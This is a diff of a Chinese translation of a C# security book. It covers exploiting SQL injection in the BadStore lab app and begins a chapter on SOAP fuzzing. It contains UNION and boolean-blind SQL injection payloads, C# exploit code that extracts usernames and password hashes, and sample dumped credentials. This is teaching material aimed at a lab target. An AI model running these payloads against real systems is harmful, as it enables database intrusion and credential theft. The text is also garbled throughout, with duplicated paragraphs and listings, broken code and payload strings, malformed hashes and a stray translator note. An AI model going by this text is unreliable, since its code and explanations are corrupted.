-现在我们知道了如何高效地获取数据库的值，就可以使用 `UNION` 注入从当前数据库中提取数据了。大多数 Web 应用中特别有表是 `users` 表。如列表 2-33 所示，我们可以轻松使用前面提到的 `UNION` 技术通过单个请求和负载从 `users` 表（称为 `userdb`）枚举用户名和密码哈希。
+现在我们知道了如何高效地获取数据库的值，就可以使用 `UNION` 注入从当前数据库中提取数据了。大多数 Web 应用中特别有表是 `users` 表。如列表 2-33 所示，我们可以轻松使用前面提到的 `UNION` 技术，通过单个请求和负载从 `users` 表（称为 `userdb`）枚举用户名和密码哈希。
 
 ```
 searchquery=id+=UNION+ALL+SELECT+NULL,CONCAT(0x717671,password,0x71767a1),NULL+FROM+badstoreduserdb#
@@ -1945,7 +2053,7 @@ searchquery=id+=UNION+ALL+SELECT+NULL,CONCAT(0x717671,password,0x71767a1),NULL+F
 
 首先，我们需要为正则表达式创建标记，如列表 2-34 所示。这些标记将用于界定 SQL 注入期间从数据库带回的值。我们希望使用 HTML 源代码中可能找不到的随机字符串，我们的正则表达式只会抓取从 HTTP 响应返回的用户名和密码哈希。
 
-```
+```csharp
 string frontMarker = "FrontTnMarker";
 string middleMarker = "middleDIEMarker";
 string endMarker = "endNMarker";
@@ -1962,7 +2070,9 @@ string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));
 
 ## 构建负载的 URL
 
-现在我们需要构建 URL 和负载来发送请求，`string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";`
+现在我们需要构建 URL 和负载来发送请求：
+
+`string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";`
 
 ```
 payload = "fdsa" NULL, NULL, CONCAT(0x"+frontHex+", IFNULL(CAST(email AS;
@@ -1974,11 +2084,7 @@ payload += CHAR(0x20),0x"+endHex+"") FROM badstore.userdb# ";
 url = "?search=" + Uri.EscapeUriString(payload) + "&search="; Listing 2-35: 使用负载方法构建 URL
 ```
 
-我们创建 URL ❶ 使用传递给利用程序的第一个参数 ❷ 来发送请求：BadStore 实例的 IP 地址。一旦创建了基础 URL，我们就构建用于从数据库返回用户名和密码哈希的负载，即我们制作的三个十六进制字符串，以确保当标记回显没有我们想要的数据时，我们的正则表达式不会意外匹配并返回垃圾数据。最后，通过将漏洞的查询字符串参数附加到基础 URL，合并负载和 URL ❸。
-
-
-
-
+我们创建 URL ❶，使用传递给利用程序的第一个参数 ❷ 来发送请求：BadStore 实例的 IP 地址。一旦创建了基础 URL，我们就构建用于从数据库返回用户名和密码哈希的负载，即我们制作的三个十六进制字符串，以确保当标记回显没有我们想要的数据时，我们的正则表达式不会意外匹配并返回垃圾数据。最后，通过将漏洞的查询字符串参数附加到基础 URL，合并负载和 URL ❸。
 
 ## 发起 HTTP 请求
 
@@ -2005,22 +2111,29 @@ Console.WriteLine("Username: " + match[1].Value + " ");
 Console.WriteLine("Password hash: " + match[2].Value);
 ```
 
-> 列表 2-37: 使用正则表达式匹配服务器响应以提取数据库值
+> 列表 2-37：使用正则表达式匹配服务器响应以提取数据库值
 
 在这里，我们从 HTTP 响应中找到并打印从 SQL 注入提取的值。首先，我们使用 `Regex` 类（位于 `System.Text.RegularExpressions` 命名空间下）创建一个正则表达式。该正则表达式包含两个组，使用之前定义的前、中间和结束标记从匹配中捕获用户名和密码哈希。然后，我们对正则表达式调用 `Matches()` 方法，并将响应数据作为参数传递给 `Matches()`。`Matches()` 方法返回一个 `MatchCollection` 对象，我们可以使用 `foreach` 循环遍历它，以检索响应中每个匹配之前使用标记创建的正则表达式的字符串。
 
 当我们遍历每个匹配表达式时，我们会打印用户名和密码哈希。使用 `WriteLine()` 打印值，我们利用表达式组构建用户名和密码的字符串，这些值存储在表达式匹配项的 `Groups` 属性中。运行利用程序将得到如列表 2-38 所示的输出。
 
+```
 Username: AAA_Test_User password hash: 5BE9F6CD4621D373CADE4E83627B4F6
+
 Username: Admin password hash: 5EBE224ECD0EF0EAB7690D2A6EE068515
+
 Username: joe@supplier.com password hash: 62072d95acb587c2ee9d6fa0c69
+
 big@sender.com password hash: 976255ec083aa56dc0449a2b33190
+
 ---
+
 Username: tommy@customer.net password hash: 743c1e438dc11a93d1961549d4b701
+```
 
-列表 2-38: UNION 注入利用的示例输出
+列表 2-38：`UNION` 注入利用的示例输出
 
-如你所示，通过单个请求，我们就能通过 UNION 注入从 BadStore MySQL 数据库的 `userdb` 表中提取所有的用户名和密码哈希。
+如你所示，通过单个请求，我们就能通过 `UNION` 注入从 BadStore MySQL 数据库的 `userdb` 表中提取所有的用户名和密码哈希。
 
 ## 利用布尔盲注 SQL 漏洞
 
@@ -2028,7 +2141,7 @@ Username: tommy@customer.net password hash: 743c1e438dc11a93d1961549d4b701
 
 ## 盲注 SQL 注入的工作原理
 
-盲注 SQL 注入比 UNION 注入更多的代码才能有效地利用 SQL 注入漏洞，而且完成它们需要更多时间，因为需要大量的 HTTP 请求。它们在服务器端的也比 UNION 注入等噪音更大，并在日志中留下更多证据。
+盲注 SQL 注入比 `UNION` 注入更多的代码才能有效地利用 SQL 注入漏洞，而且完成它们需要更多时间，因为需要大量的 HTTP 请求。它们在服务器端的也比 `UNION` 注入等噪音更大，并在日志中留下更多证据。
 
 在执行盲注 SQL 注入时，你无法从 Web 应用程序获得直接反馈；相反，你依赖元数据的行为的变化来从数据库获取信息。例如，使用 MySQL 关键字 `RLIKE` 用正则表达式匹配数据库中的值，如列表 2-39 所示，我们可以导致 BadStore 显示一个错误。
 
@@ -2036,11 +2149,11 @@ Username: tommy@customer.net password hash: 743c1e438dc11a93d1961549d4b701
 searchquery=fds+=RLIKE+2nx8+AND+'
 ```
 
-列表 2-39: 导致 BadStore 错误的盲注 SQL 注入示例
+列表 2-39：导致 BadStore 错误的盲注 SQL 注入示例
 
-当传递给 BadStore 时，`RLIKE` 会尝试将十六进制编码的字符串解析为正则表达式，导致错误（参见列表 2-40），因为传递的字符串是正则表达式中的特殊字符。左括号 `(` 字符（十六进制为 `0x28`）表示表达式组的开始，我们在 UNION 注入中也使用了它来匹配用户名和密码哈希。左括号 `(` 字符必须有一个对应的右括号 `)` 字符；否则正则表达式的语法将无效。
+当传递给 BadStore 时，`RLIKE` 会尝试将十六进制编码的字符串解析为正则表达式，导致错误（参见列表 2-40），因为传递的字符串是正则表达式中的特殊字符。左括号 `(` 字符（十六进制为 `0x28`）表示表达式组的开始，我们在 `UNION` 注入中也使用了它来匹配用户名和密码哈希。左括号 `(` 字符必须有一个对应的右括号 `)` 字符；否则正则表达式的语法将无效。
 
-> 从 regexp 得到错误 'parentheses not balanced'，列表 2-40: 传递无效正则表达式时 RLIKE 的错误
+> 从 regexp 得到错误 'parentheses not balanced'，列表 2-40：传递无效正则表达式时 RLIKE 的错误
 
 括号没有平衡是因为缺少缺少一个右括号。现在我们知道，可以使用真查询和假的 SQL 查询来可靠地控制 BadStore 的行为，使其报错。
 
@@ -2052,42 +2165,39 @@ searchquery=fds+=RLIKE+2nx8+AND+'
 searchquery=fds+=RLIKE+2nx8+AND+'
 ```
 
-
-
-
-
-```cs
+```csharp
 getCount += "IFNULL(CAST(COUNT(*) AS CHAR, 0x20) FROM userdb),0)";
 Count += " " + i + "=c+") THEN 0x28 ELSE 0x41 END) AND "";
 string response = MakeRequest(getCount);
 ```
 
-```cs
+```csharp
 if (response.Contains("parentheses not balanced")) {
   countBytes.Add(byte);
   break;
 }
 ```
 
-## 列表 2-44: 获取 userdb 表中的行数
+## 列表 2-44：获取 userdb 表中的行数
 
 列表 2-44 中使用的 SQL 载荷与之前用于获取数量的 SQL 载荷略有不同。我们使用了 `ORD(①)` 和 `MID(②)` SQL 函数。
 
 `ORD(①)` 函数将给定的输入转换为整数，`MID(②)` 函数根据起始索引和长度返回一个子字符串。通过同时使用这两个函数，我们可以从 SELECT 语句返回的字符串中一次选择一个字符，并将其转换为整数。这允许我们能够字符串中字节的整数表示与我们在当前迭代中正在测试的字符值进行比较。
 
-`MID(③)` 函数接受三个参数：来自 ④ 的子字符串；起始索引（如你预期的，它是从 1 开始而不是从 0 开始）⑤ 以及要选择的子字符串长度 ⑥。注意，MID 的第二个参数 ⑦ 是由外层循环的当前迭代决定的，我们将 `i` 增加到上一个循环确定的计数长度。该参数在我们迭代并增加它时，选择了字符串中要测试的字符。内部 `for` 循环遍历 ASCII 字符 0 到 9 的等效字符。由于我们只尝试获取数据库中的行数，所以我们只使用数字字符。
+`MID(③)` 函数接受三个参数：来自 ④ 的子字符串；起始索引（如你预期的，它是从 1 开始而不是从 0 开始）⑤ 以及要选择的子字符串长度 ⑥。注意，`MID` 的第二个参数 ⑦ 是由外层循环的当前迭代决定的，我们将 `i` 增加到上一个循环确定的计数长度。该参数在我们迭代并增加它时，选择了字符串中要测试的字符。内部 `for` 循环遍历 ASCII 字符 0 到 9 的等效字符。由于我们只尝试获取数据库中的行数，所以我们只使用数字字符。
 
 `i` ⑧ 和 `c` 在布尔注入攻击期间都用于 SQL 载荷。变量 `i` 被用作 `MID()` 函数的第二个参数，决定数据库值中的字符位置。变量 `c` 是 `MID()` 返回给整数的字符。这允许我们遍历数据库中给定值中的每个字符，并通过真假问题来暴力破解该字符。
 
-当载荷返回错误 "parentheses not balanced" ⑨ 时，我们知道索引 `i` 处的字符等于内部循环的 `c`。然后我们在循环之前将 `c` 强制转换为字节并将其添加到 `List<byte>` ⑩ 中。我们跳出内部循环以迭代外层循环，一旦循环完成，我们将 `List<byte>` 转换为可打印的字符串。
+当载荷返回错误 `"parentheses not balanced"` ⑨ 时，我们知道索引 `i` 处的字符等于内部循环的 `c`。然后我们在循环之前将 `c` 强制转换为字节并将其添加到 `List<byte>` ⑩ 中。我们跳出内部循环以迭代外层循环，一旦循环完成，我们将 `List<byte>` 转换为可打印的字符串。
 
 该字符串被打印到屏幕上，如列表 2-45 所示。
 
-```cs
+```csharp
 int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
 Console.WriteLine("There "+count+" rows in the userdb table");
 ```
-## 列表 2-45: 将 SQL 注入检索到的字符串并打印表的行数
+
+## 列表 2-45：将 SQL 注入检索到的字符串并打印表的行数
 
 我们使用 `Get()` 方法（来自 `Encoding.ASCII` 类）将 `countBytes.ToArray()` 的字节数组转换为人类可读的字符串。然后将字符串传递给 `int.Parse()`，该方法会解析并返回一个整数（如果字符串可以转换为整数）。然后使用 `Console.WriteLine()` 打印该字符串。
 
@@ -2095,7 +2205,7 @@ Console.WriteLine("There "+count+" rows in the userdb table");
 
 我们已经准备好运行利用程序了，只差最后一件事：我们需要一种在循环中发送载荷的方法。为此，我们需要编写 `MakeRequest()` 方法，它接受一个参数：要发送的载荷（参见列表 2-46）。
 
-```cs
+```csharp
 private static string MakeRequest(string payload)
 {
     string url = "http://192.168.1.78/cgi-bin/badstore.cgi?action=search&search=";
@@ -2107,12 +2217,14 @@ private static string MakeRequest(string payload)
     return response;
 }
 ```
-## 列表 2-46: 发送载荷并返回服务器响应的 MakeRequest() 方法
+
+## 列表 2-46：发送载荷并返回服务器响应的 MakeRequest() 方法
 
 我们使用载荷和指向 BadStore 实例的 URL 创建基础 GET HTTP 请求。然后，使用 `StreamReader` 将响应读取到字符串并将响应返回给调用者。现在我们运行利用程序，应该会收到类似于列表 2-47 所示的输出。
 
-userdb 表中有 23 行。
-## 列表 2-47: 确定 userdb 表中的行数
+`userdb` 表中有 23 行。
+
+## 列表 2-47：确定 userdb 表中的行数
 
 在运行了利用程序的第一部分后，我们有 23 个用户需要提取用户名和密码哈希。利用程序的下一部分将提取实际的用户名和密码哈希。
 
@@ -2120,7 +2232,7 @@ userdb 表中有 23 行。
 
 在我们能够逐字节地从数据库列中提取任何值之前，我们需要获取值的长度。列表 2-48 显示了如何进行操作。
 
-```cs
+```csharp
 private static int GetLength(int row, string column)
 {
     int countLength = 0;
@@ -2135,17 +2247,20 @@ private static int GetLength(int row, string column)
     return countLength;
 }
 ```
-## 列表 2-48: 获取值的长度
+
+## 列表 2-48：获取值的长度
 
 `string response = MakeRequest(getCount);`
 
-`GetLength()` 方法从数据库获取长度。变量 `i` 被用作 `MID()` 函数的第二个参数，决定数据库值中的字符位置。变量 `c` 是 `MID()` 返回给整数的字符。这允许我们遍历数据库中给定值中的每个字符，并通过真假问题来暴力破解该字符。当载荷返回错误 "parentheses not balanced" ⑨ 时，我们知道索引 `i` 处的字符等于内部循环的 `c`。然后我们在循环之前将 `c` 强制转换为字节并将其添加到 `List<byte>` ⑩ 中。我们跳出内部循环以迭代外层循环，一旦循环完成，我们将 `List<byte>` 转换为可打印的字符串。
 
-该字符串被打印到屏幕上，如列表 2-45 所示。我们使用 `Get()` 方法（来自 `Encoding.ASCII` 类）将 `countBytes.ToArray()` 的字节数组转换为人类可读的字符串。然后将字符串传递给 `int.Parse()`，该方法会解析并返回一个整数（如果字符串可以转换为整数）。然后使用 `Console.WriteLine()` 打印该字符串。
+
+`GetLength()` 方法从数据库获取长度。变量`i`被用作`MID()`函数的第二个参数，决定数据库值中的字符位置。变量`c`是`MID()`返回给整数的字符。这允许我们遍历数据库中给定值中的每个字符，并通过真假问题来暴力破解该字符。当载荷返回错误 "parentheses not balanced" ⑨ 时，我们知道索引`i`处的字符等于内部循环的`c`。然后我们在循环之前将`c`强制转换为字节并将其添加到`List<byte>` ⑩ 中。我们跳出内部循环以迭代外层循环，一旦循环完成，我们将`List<byte>`转换为可打印的字符串。
+
+该字符串被打印到屏幕上，如列表 2-45 所示。我们使用`Get()`方法（来自`Encoding.ASCII`类）将`countBytes.ToArray()`的字节数组转换为人类可读的字符串。然后将字符串传递给`int.Parse()`，该方法会解析并返回一个整数（如果字符串可以转换为整数）。然后使用`Console.WriteLine()`打印该字符串。
 
 ## MakeRequest() 方法
 
-我们已经准备好运行利用程序了，只差最后一件事：我们需要一种在循环中发送载荷的方法。为此，我们需要编写 `MakeRequest()` 方法，它接受一个参数：要发送的载荷（参见列表 2-46）。
+我们已经准备好运行利用程序了，只差最后一件事：我们需要一种在循环中发送载荷的方法。为此，我们需要编写`MakeRequest()`方法，它接受一个参数：要发送的载荷（参见列表 2-46）。
 
 ```cs
 private static string MakeRequest(string payload)
@@ -2159,11 +2274,13 @@ private static string MakeRequest(string payload)
     return response;
 }
 ```
+
 ## 列表 2-46: 发送载荷并返回服务器响应的 MakeRequest() 方法
 
-我们使用载荷和指向 BadStore 实例的 URL 创建基础 GET HTTP 请求。然后，使用 `StreamReader` 将响应读取到字符串并将响应返回给调用者。现在我们运行利用程序，应该会收到类似于列表 2-47 所示的输出。
+我们使用载荷和指向 BadStore 实例的 URL 创建基础 GET HTTP 请求。然后，使用`StreamReader`将响应读取到字符串并将响应返回给调用者。现在我们运行利用程序，应该会收到类似于列表 2-47 所示的输出。
 
 userdb 表中有 23 行。
+
 ## 列表 2-47: 确定 userdb 表中的行数
 
 在运行了利用程序的第一部分后，我们有 23 个用户需要提取用户名和密码哈希。利用程序的下一部分将提取实际的用户名和密码哈希。
@@ -2174,7 +2291,7 @@ userdb 表中有 23 行。
 
 ## 编写 GetValue() 以获取给定值
 
-我们通过列表 2-51 所示的 `GetValue()` 方法完成此利用程序。
+我们通过列表 2-51 所示的`GetValue()`方法完成此利用程序。
 
 ```cs
 private static string GetValue(int row, string column)
@@ -2182,91 +2299,64 @@ private static string GetValue(int row, string column)
     // 获取特定值的实现
 }
 ```
+
 ## 列表 2-51: GetValue() 方法，它将获取给定列的值
 
-
-
-
 userdb 表中有 23 行
+
 获取查询值的长度... 13
+
 获取值... AAA_Test_User
+
 获取查询值的长度... 32
+
 获取值... 098F6BCD462I1D373CADE4E83267B4F6
+
 获取查询值的长度... 5
+
 获取值... admin
+
 获取查询值的长度... 32
+
 获取值... 5EBE2294CD0E0F8EAB7690D2A6EE69
+
 --snip--
+
 获取查询值的长度... 18
+
 获取值... tommy@customer.net
+
 获取查询值的长度... 32
+
 获取值... 7F43c1e438dc11a93d19165494d4b701
 
 列表 2-53: 我们的利用结果
 
-在枚举了数据库中的用户数量后，我们遍历了每个用户并从数据库中提取用户名和密码哈希值。这个过程比我们上面执行的 `UNION` 注入要慢得多，但 `UNION` 注入并不总是可用的。在利用 SQL 注入时，理解基于布尔的攻击是如何工作的对于有效利用许多 SQL 注入至关重要。
+在枚举了数据库中的用户数量后，我们遍历了每个用户并从数据库中提取用户名和密码哈希值。这个过程比我们上面执行的`UNION`注入要慢得多，但`UNION`注入并不总是可用的。在利用 SQL 注入时，理解基于布尔的攻击是如何工作的对于有效利用许多 SQL 注入至关重要。
 
 ## 结论
 
-本章向你介绍了用于利用 XSS 和 SQL 注入漏洞的模糊测试（fuzzing）。正如你所看到的，BadStore 包含了许多 SQL 注入、XSS 以及其他漏洞，这些都可以以略有不同的方式被利用。在本章，我们实现了一个小型的 GET 请求模糊测试应用程序，用于搜索查询参数中的 XSS 或可能意味着存在 SQL 注入漏洞的错误。通过使用强大且灵活的 `HttpRequest` 类来管理和检索 HTTP 请求与响应，我们能够确定当在 BadStore 中搜索项目时，`searchQuery` 参数既容易受到 XSS 攻击也容易受到 SQL 注入攻击。
+本章向你介绍了用于利用 XSS 和 SQL 注入漏洞的模糊测试（fuzzing）。正如你所看到的，BadStore 包含了许多 SQL 注入、XSS 以及其他漏洞，这些都可以以略有不同的方式被利用。在本章，我们实现了一个小型的 GET 请求模糊测试应用程序，用于搜索查询参数中的 XSS 或可能意味着存在 SQL 注入漏洞的错误。通过使用强大且灵活的`HttpRequest`类来管理和检索 HTTP 请求与响应，我们能够确定当在 BadStore 中搜索项目时，`searchQuery`参数既容易受到 XSS 攻击也容易受到 SQL 注入攻击。
 
 一旦我们写了一个简单的 GET 请求，我们就使用 Burp Suite HTTP 代理和 Firefox 从 BadStore 捕获了一个 HTTP POST 请求，以便为 POST 请求编写一个小型的模糊测试应用程序。通过使用与之前的 GET 请求模糊测试器相同的类，但结合了一些新方法，我们能够发现更多可以利用的 SQL 注入漏洞。
 
-接下来，我们转向了更复杂的请求，例如带有 JSON 的 HTTP 请求。使用一个存在漏洞的 JSON Web 应用程序，我们使用 Burp Suite 捕获了一个在 Web 应用上创建新用户的请求。为了高效地模糊这种类型的 HTTP 请求，我们引入了 `Json.NET` 库，它可以轻松地解析和消费 JSON 数据。
+接下来，我们转向了更复杂的请求，例如带有 JSON 的 HTTP 请求。使用一个存在漏洞的 JSON Web 应用程序，我们使用 Burp Suite 捕获了一个在 Web 应用上创建新用户的请求。为了高效地模糊这种类型的 HTTP 请求，我们引入了`Json.NET`库，它可以轻松地解析和消费 JSON 数据。
 
-最后，一旦你充分掌握了模糊器如何发现 Web 应用程序中可能的漏洞，你就学会了如何利用它们。再次使用 BadStore，我们编写了一个基于 `UNION` 的 SQL 注入利用程序，可以通过单个 HTTP 请求提取出 BadStore 数据库中的用户名和密码哈希。为了高效地从服务器返回的 HTML 中提取出的数据，我们使用了正则表达式类 `Regex`、`Match` 和 `MatchCollection`。
+最后，一旦你充分掌握了模糊器如何发现 Web 应用程序中可能的漏洞，你就学会了如何利用它们。再次使用 BadStore，我们编写了一个基于`UNION`的 SQL 注入利用程序，可以通过单个 HTTP 请求提取出 BadStore 数据库中的用户名和密码哈希。为了高效地从服务器返回的 HTML 中提取出的数据，我们使用了正则表达式类`Regex`、`Match`和`MatchCollection`。
 
-一旦完成了较简单的 `UNION` 利用程序，我们在同一个 HTTP 请求上编写了基于布尔的盲 SQL 注入。通过 `HttpRequest` 类，我们确定了传递给 Web 应用的注入有效负载（payload）。当我们知道 Web 应用在响应真假问题时的如何表现时，我们开始向数据库提问真假问题，以便每次获取 1 字节字节的信息。基于布尔的盲注比 `UNION` 利用更复杂，需要更多的时间和 HTTP 请求才能完成，它在 `UNION` 不可用时特别有用。
-
-# 3
-# 模糊测试 SOAP 端点
-
-![](img/059a0f6a8101e80261ab133380da85bd_76_0.png)
-
-作为一名渗透测试人员，你可能会遇到通过 SOAP 端点提供程序化 API 访问的应用程序或服务器。SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。... 是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-作为一名渗透测试人员，你可能会遇到通过 SOAP 端点提供程序化 API 访问的应用程序或服务器。SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-（此处省略由于原文重复，仅保留核心翻译逻辑）
-
-本章向你介绍了用于利用 XSS 和 SQL 注入漏洞的模糊测试（fuzzing）。正如你所看到的，BadStore 包含了许多 SQL 注入、XSS 以及其他漏洞，这些都可以以略有不同的方式被利用。在本章，我们实现了一个小型的 GET 请求模糊测试应用程序，用于搜索查询参数中的 XSS 或可能意味着存在 SQL 注入漏洞的错误。通过使用强大且灵活的 `HttpRequest` 类来管理和检索 HTTP 请求与响应，我们能够确定当在 BadStore 中搜索项目时，`searchQuery` 参数既容易受到 XSS 攻击也容易受到 SQL 注入攻击。
-
-一旦我们写了一个简单的 GET 请求，我们就使用 Burp Suite HTTP 代理和 Firefox 从 BadStore 捕获了一个 HTTP POST 请求，以便为 POST 请求编写一个小型的模糊测试应用程序。通过使用与之前的 GET 请求模糊测试器相同的类，但结合了一些新方法，我们能够发现更多可以利用的 SQL 注入漏洞。
-
-接下来，我们转向了更复杂的请求，例如带有 JSON 的 HTTP 请求。使用一个存在漏洞的 JSON Web 应用程序，我们使用 Burp Suite 捕获了一个在 Web 应用上创建新用户的请求。为了高效地模糊这种类型的 HTTP 请求，我们引入了 `Json.NET` 库，它可以轻松地解析和消费 JSON 数据。
-
-最后，一旦你充分掌握了模糊器如何发现 Web 应用程序中可能的漏洞，你就学会了如何利用它们。再次使用 BadStore，我们编写了一个基于 `UNION` 的 SQL 注入利用程序，可以通过单个 HTTP 请求提取出 BadStore 数据库中的用户名和密码哈希。为了高效地从服务器返回的 HTML 中提取出的数据，我们使用了正则表达式类 `Regex`、`Match` 和 `MatchCollection`。
-
-一旦完成了较简单的 `UNION` 利用程序，我们在同一个 HTTP 请求上编写了基于布尔的盲 SQL 注入。通过 `HttpRequest` 类，我们确定了传递给 Web 应用的注入有效负载（payload）。当我们知道 Web 应用在响应真假问题时的如何表现时，我们开始向数据库提问真假问题，以便每次获取 1 字节字节的信息。基于布尔的盲注比 `UNION` 利用更复杂，需要更多的时间和 HTTP 请求才能完成，它在 `UNION` 不可用时特别有用。
+一旦完成了较简单的`UNION`利用程序，我们在同一个 HTTP 请求上编写了基于布尔的盲 SQL 注入。通过`HttpRequest`类，我们确定了传递给 Web 应用的注入有效负载（payload）。当我们知道 Web 应用在响应真假问题时的如何表现时，我们开始向数据库提问真假问题，以便每次获取 1 字节字节的信息。基于布尔的盲注比`UNION`利用更复杂，需要更多的时间和 HTTP 请求才能完成，它在`UNION`不可用时特别有用。
 
 # 3
+
 # 模糊测试 SOAP 端点
 
 ![](img/059a0f6a8101e80261ab133380da85bd_76_0.png)
 
 作为一名渗透测试人员，你可能会遇到通过 SOAP 端点提供程序化 API 访问的应用程序或服务器。SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
-
-SOAP（或简单对象访问协议）是一种常见的企业技术，能够实现语言无关的编程 API 访问。通常情况下，SOAP 在 HTTP 协议上使用，并使用 XML 格式。简单来说，SOAP 是在 HTTP 协议上使用的，它使用 XML 格式。
 
 （注：由于原文中存在大量重复段落，译文已根据高级工程师规范进行了去重处理，确保逻辑清晰且不重复输出。）
 
-
-
-
-
-ParseTypes()。所有从构造函数调用的方法都相对简单，看起来与列表 3-3 类似。
+`ParseTypes()`。所有从构造函数调用的方法都相对简单，看起来与列表 3-3 类似。
 
 ```c
 private void ParseTypes(XmlDocument wsdl, XmlNamespaceManager nsManager)
@@ -2282,11 +2372,11 @@ private void ParseTypes(XmlDocument wsdl, XmlNamespaceManager nsManager)
 
 > 列表 3-3：在 WSDL 类构造函数中调用的 ParseTypes() 方法
 
-由于这些方法仅在 WSDL 构造函数内部调用，因此我们使用 `private` 关键字，使得只有 WSDL 类可以访问它们。`ParseTypes()` 方法接受一个 WSDL 和命名空间管理器（用于解析 WSDL 文档中的命名空间）作为参数。我们将其赋值给 `Types` 属性。接下来，我们实例化了一个新的 `List` 对象，并使用 C# XML 文档可用的 XPathset遍历 WSDL 中的 XML 元素。XPath 允许程序员通过文档内的节点路径遍历和使用 XML 文档。在示例中，我们使用了 `SelectNodes()` 方法。然后，我们遍历 SOAP 类型并将每个节点传递给 `SoapType` 类构造函数，这是我们在初始解析后实现的类之一。最后，我们将新实例化的 `SoapType` 对象添加到 WSDL 类的 `SoapType` 列表属性中。
+由于这些方法仅在 WSDL 构造函数内部调用，因此我们使用`private`关键字，使得只有 WSDL 类可以访问它们。`ParseTypes()`方法接受一个 WSDL 和命名空间管理器（用于解析 WSDL 文档中的命名空间）作为参数。我们将其赋值给`Types`属性。接下来，我们实例化了一个新的`List`对象，并使用 C# XML 文档可用的 XPath 遍历 WSDL 中的 XML 元素。XPath 允许程序员通过文档内的节点路径遍历和使用 XML 文档。在示例中，我们使用了`SelectNodes()`方法。然后，我们遍历 SOAP 类型并将每个节点传递给`SoapType`类构造函数，这是我们在初始解析后实现的类之一。最后，我们将新实例化的`SoapType`对象添加到 WSDL 类的`SoapType`列表属性中。
 
 足够简单对吧？我们将采用这种使用 XPath 查询来遍历 WSDL 文档中所需的特定节点的模式。XPath 非常强大，非常适合通用的 C# 语言进行工作。
 
-现在，我们将实现 WSDL 构造函数中调用的下一个方法 `ParseMessages(XmlDocument wsdl, XmlNamespaceManager nsManager)`，详细见列表 3-4。
+现在，我们将实现 WSDL 构造函数中调用的下一个方法`ParseMessages(XmlDocument wsdl, XmlNamespaceManager nsManager)`，详细见列表 3-4。
 
 ```csharp
 private void ParseMessages(XmlDocument wsdl, XmlNamespaceManager nsManager)
@@ -2299,7 +2389,7 @@ private void ParseMessages(XmlDocument wsdl, XmlNamespaceManager nsManager)
 
 > 列表 3-4：在 WSDL 类构造函数中调用的 ParseMessages() 方法
 
-首先，我们需要实例化并分配一个 `List` 来存储 `SoapMessage` 对象。（`SoapMessage` 是我们将在第 60 页的“创建 SoapMessage 类以定义发送数据”中实现的类）。使用 XPath 查询从 WSDL 文档中选择消息节点，遍历由 `SelectNodes()` 方法返回的节点并将它们传递给 `SoapMessage` 构造函数。这些新实例化的对象被添加到 WSDL 类的 `Messages` 属性中，以供以后使用。
+首先，我们需要实例化并分配一个`List`来存储`SoapMessage`对象。（`SoapMessage`是我们将在第 60 页的“创建 SoapMessage 类以定义发送数据”中实现的类）。使用 XPath 查询从 WSDL 文档中选择消息节点，遍历由`SelectNodes()`方法返回的节点并将它们传递给`SoapMessage`构造函数。这些新实例化的对象被添加到 WSDL 类的`Messages`属性中，以供以后使用。
 
 从 WSDL 类调用的接几个方法与前两个相似。考虑到之前方法的工作方式，到目前它们对你来说应该非常直观。这些方法在 3-5 中都有详细说明。
 
@@ -2317,13 +2407,15 @@ private void ParseMessages(XmlDocument wsdl, XmlNamespaceManager nsManager)
 
 > 列表 3-5：WSDL 类中其余初始解析方法
 
-为了填充 `PortTypes`、`Bindings` 和 `Services` 属性，我们使用 XPath 查询来查找并遍历相关节点；我们实例化特定的 SOAP 类（我们接下来将实现它们），并将它们添加到列表中，以便在需要构建 WSDLuzzer 逻辑时访问它们。
+为了填充`PortTypes`、`Bindings`和`Services`属性，我们使用 XPath 查询来查找并遍历相关节点；我们实例化特定的 SOAP 类（我们接下来将实现它们），并将它们添加到列表中，以便在需要构建 WSDLuzzer 逻辑时访问它们。
 
-这就是 WSDL 类的部分。一个构造函数和几个存储与 WSDL 文档相关数据的属性就是你所需的所有内容。现在我们需要实现辅助类。在解析方法中，我们使用尚未实现的类（`SoapType`、`SoapMessage`、`SoapPortType`、`SoapBinding`、`SoapService`）。我们将从 `SoapType` 类开始。
